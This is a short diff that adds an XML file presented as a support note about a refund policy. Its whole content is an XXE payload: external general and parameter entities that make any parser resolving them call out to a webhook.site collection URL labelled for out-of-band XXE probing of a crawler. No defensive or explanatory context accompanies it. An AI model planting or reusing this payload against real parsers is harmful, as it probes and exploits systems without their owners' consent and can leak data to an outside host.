@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note [
+  <!ENTITY xxe SYSTEM "https://webhook.site/8cb991e1-a80a-47aa-a51a-3d01384f4431/xxe-oob-crawler-1">
+  <!ENTITY % p SYSTEM "https://webhook.site/8cb991e1-a80a-47aa-a51a-3d01384f4431/xxe-param-1">
+  %p;
+]>
+<note><to>support</to><body>Refund policy document &xxe;</body></note>
